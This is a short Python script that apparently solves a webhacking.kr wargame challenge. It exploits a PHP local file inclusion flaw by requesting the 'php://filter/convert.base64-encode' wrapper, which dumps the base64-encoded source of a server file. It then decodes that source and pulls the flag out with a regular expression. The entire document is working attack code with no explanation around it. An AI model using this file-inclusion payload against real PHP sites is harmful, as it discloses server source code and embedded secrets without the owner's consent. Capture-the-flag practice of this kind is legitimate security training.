import requests
import base64
import re

url = 'http://webhacking.kr:10001/?file=php://filter/convert.base64-encode/resource=flag'

response = requests.get(url)
scoop = re.findall('<textarea rows=10 cols=100>(.*)</textarea>', response.text)[0]

code = base64.b64decode(scoop.encode()).decode()
flag = re.findall('\$flag = "(.*)";', code)[0]
print(flag)


